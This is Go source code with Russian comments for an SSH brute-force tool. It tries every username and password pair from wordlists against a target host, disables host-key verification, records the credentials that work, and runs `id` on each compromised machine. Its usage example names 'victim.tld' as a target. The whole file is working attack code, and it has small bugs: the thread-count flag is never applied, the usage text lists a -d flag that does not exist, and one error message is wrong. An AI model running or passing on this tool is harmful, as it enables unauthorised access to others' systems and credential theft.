package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const maxLimit = 15

var (
	limit    = *flag.Int("l", 10, "Кол-во потоков")
	host     = flag.String("h", "", "Хост и порт")
	userList = flag.String("u", "", "Файл с списком username")
	passList = flag.String("p", "", "Файл с списком паролей")
	out      = flag.String("o", "", "Файл с результатами")
)

var throttler = make(chan int, limit)

// helper - выводит вспомогательный лог
func helper() {
	fmt.Printf(`
Usage: %s [-h HOST:PORT] [-u USERS] [-p PASSWORDS] [-d]
Examples:
	%s -h 127.0.0.1:22 -u my-users.txt -p my-passes.txt -o results.txt
	%s -h victim.tld:2233 -u users.txt -p passwords.lst -d > output.txt
`, os.Args[0], os.Args[0], os.Args[0])
	os.Exit(1)
}

func main() {
	flag.Parse()

	if limit > maxLimit {
		errorln("Максимальное кол-во потоков " + strconv.Itoa(limit))
		os.Exit(1)
	}

	if *host == "" || *userList == "" || *passList == "" {
		helper()
	}

	if err := checkHost(); err != nil {
		errorln("Произошла ошибка при подключении к хосту")
		os.Exit(1)
	}

	users, err := readFile(*userList)
	if err != nil {
		errorln("Произошла ошибка при чтении файла с юзернеймами")
		os.Exit(1)
	}

	passwords, err := readFile(*passList)
	if err != nil {
		errorln("Произошла ошибка при чтении файла с паролями")
		os.Exit(1)
	}

	// Проверяет, указан ли флаг для файла с результатами, если нет, то выводит в stdout
	var outfile *os.File
	if *out == "" {
		outfile = os.Stdout
	} else {
		outfile, err = os.Create(*out)
		if err != nil {
			errorln("Произошла ошибка при создании файла с результатами")
			os.Exit(1)
		}
		defer outfile.Close()
	}

	// Создаем группу ожидания
	var wg sync.WaitGroup
	for _, user := range users {
		for _, pass := range passwords {
			throttler <- 0
			wg.Add(1)
			go connect(&wg, outfile, user, pass)
		}
	}
	// дождаться всех задач
	wg.Wait()
}

// checkHost - проверяет, работает ли хост
func checkHost() (err error) {
	debugln("Подключаемся к хосту...")
	conn, err := net.Dial("tcp", *host)
	if err != nil {
		return
	}
	conn.Close()
	return
}

// connect - подключается к машине по ssh
func connect(wg *sync.WaitGroup, o *os.File, user, pass string) {
	// законили выполнение задачи
	defer wg.Done()

	debugln(fmt.Sprintf("В процессе %s:%s...\n", user, pass))

	sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         5 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()

	c, err := ssh.Dial("tcp", *host, sshConfig)
	if err != nil {
		<-throttler
		return
	}
	defer c.Close()

	log.Printf("[Found] Найдено! %s:%s\n", user, pass)
	fmt.Fprintf(o, "%s:%s\n", user, pass)

	debugln("Запускаем команду `id`...")

	// Запуск команды id на подключившейся машине
	session, err := c.NewSession()
	if err == nil {
		defer session.Close()

		successln("Команда `id` успешно запущена!")

		var s_out bytes.Buffer
		session.Stdout = &s_out

		if err = session.Run("id"); err == nil {
			fmt.Fprintf(o, "\t%s", s_out.String())
		}
	}
	// получаем значение из буферизованного канала
	<-throttler
}

// readFile - читает текстовый файл .lst или .txt
func readFile(f string) (data []string, err error) {
	b, err := os.Open(f)
	if err != nil {
		return
	}
	defer b.Close()

	scanner := bufio.NewScanner(b)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}
	return
}

// debugln - выводит debug сообщение
func debugln(s string) {
	log.Println("[Debug]", s)
}

// errorln - выводит error сообщение
func errorln(s string) {
	log.Println("[ERROR]", s)
}

// successln - выводит success сообщение
func successln(s string) {
	log.Println("[SUCCESS]", s)
}
